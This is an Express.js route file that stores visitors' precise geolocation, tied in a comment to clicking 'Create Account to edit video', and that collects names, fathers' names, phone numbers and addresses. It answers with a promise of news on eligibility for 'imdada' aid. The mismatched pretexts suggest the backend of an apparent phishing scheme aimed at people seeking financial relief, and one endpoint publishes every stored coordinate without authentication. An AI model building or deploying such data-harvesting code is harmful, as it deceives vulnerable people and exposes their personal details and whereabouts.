const express = require('express');
const router = express.Router();
const Location = require('../models/Locations');
const Information = require('../models/informations_model');

// Save user location when they click Create Account to edit video
router.post('/api/save-location', async (req, res) => {
    try {
        const { latitude, longitude } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({
                success: false,
                message: 'Latitude and longitude are required'
            });
        }

        // Get real IP address (handles proxies/load balancers)
        const getClientIp = (req) => {
            return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                   req.headers['x-real-ip'] ||
                   req.connection?.remoteAddress ||
                   req.socket?.remoteAddress ||
                   req.ip ||
                   'unknown';
        };

        const clientIp = getClientIp(req);
        
        // Anonymize IP for privacy (remove last octet for IPv4, last segment for IPv6)
        const anonymizeIp = (ip) => {
            if (!ip || ip === 'unknown') return 'unknown';
            
            // Handle IPv6-mapped IPv4 (::ffff:xxx.xxx.xxx.xxx)
            if (ip.startsWith('::ffff:')) {
                const ipv4 = ip.replace('::ffff:', '');
                const parts = ipv4.split('.');
                if (parts.length === 4) {
                    return `::ffff:${parts[0]}.${parts[1]}.${parts[2]}.0`;
                }
            }
            
            // Handle regular IPv4
            if (ip.includes('.')) {
                const parts = ip.split('.');
                if (parts.length === 4) {
                    return `${parts[0]}.${parts[1]}.${parts[2]}.0`;
                }
            }
            
            // Handle IPv6 (remove last segment)
            if (ip.includes(':')) {
                const parts = ip.split(':');
                if (parts.length > 1) {
                    parts[parts.length - 1] = '0';
                    return parts.join(':');
                }
            }
            
            return ip;
        };

        const locationData = {
            latitude: parseFloat(latitude),
            longitude: parseFloat(longitude),
            ipAddress: anonymizeIp(clientIp), // Anonymized IP for privacy
            userAgent: req.get('user-agent') || 'unknown'
        };

        const location = await Location.create(locationData);

        res.json({
            success: true,
            message: 'Location saved successfully',
            locationId: location._id,
            location: {
                latitude: location.latitude,
                longitude: location.longitude
            }
        });
    } catch (error) {
        console.error('Error saving location:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving location',
            error: error.message
        });
    }
});

// Get all locations
router.get('/api/locations', async (req, res) => {
    try {
        // Don't expose IP addresses in public API for security/privacy
        const locations = await Location.find({})
            .sort({ createdAt: -1 })
            .select('latitude longitude timestamp createdAt -ipAddress -userAgent')
            .lean();

        res.json({
            success: true,
            count: locations.length,
            data: locations
        });
    } catch (error) {
        console.error('Error fetching locations:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching locations',
            error: error.message
        });
    }
});

// Validate Pakistani phone number
const validatePakistaniPhone = (phoneNumber) => {
    // Remove spaces, dashes, and other characters
    const cleaned = phoneNumber.replace(/[\s\-\(\)]/g, '');
    
    // Pakistani phone number patterns:
    // 1. 03XXXXXXXXX (11 digits starting with 03) - most common
    // 2. +923XXXXXXXXX (13 characters with +92)
    // 3. 923XXXXXXXXX (12 digits starting with 92)
    
    const patterns = [
        /^03[0-9]{9}$/,           // 03XXXXXXXXX (11 digits)
        /^\+923[0-9]{9}$/,        // +923XXXXXXXXX (13 characters)
        /^923[0-9]{9}$/           // 923XXXXXXXXX (12 digits)
    ];
    
    return patterns.some(pattern => pattern.test(cleaned));
};

// Submit user information form
router.post('/api/submit-information', async (req, res) => {
    try {
        const { name, father, gender, phoneNumber, address, latitude, longitude } = req.body;

        // Validation
        if (!name || !father || !gender || !phoneNumber || !address) {
            return res.status(400).json({
                success: false,
                message: 'All fields are required'
            });
        }

        // Validate Pakistani phone number
        if (!validatePakistaniPhone(phoneNumber)) {
            return res.status(400).json({
                success: false,
                message: 'Please enter a valid Pakistani phone number (e.g., 03001234567)'
            });
        }

        const informationData = {
            name: name.trim(),
            father: father.trim(),
            gender: gender,
            phoneNumber: phoneNumber.trim(),
            address: address.trim(),
            location: {
                latitude: latitude ? parseFloat(latitude) : null,
                longitude: longitude ? parseFloat(longitude) : null
            }
        };

        const information = await Information.create(informationData);

        res.json({
            success: true,
            message: 'Thanks for filling form. We will inform you on your number after 20 min, you are eligible for imdada or not',
            data: {
                id: information._id,
                name: information.name,
                phoneNumber: information.phoneNumber
            }
        });
    } catch (error) {
        console.error('Error submitting information:', error);
        res.status(500).json({
            success: false,
            message: 'Error submitting information',
            error: error.message
        });
    }
});

module.exports = router;

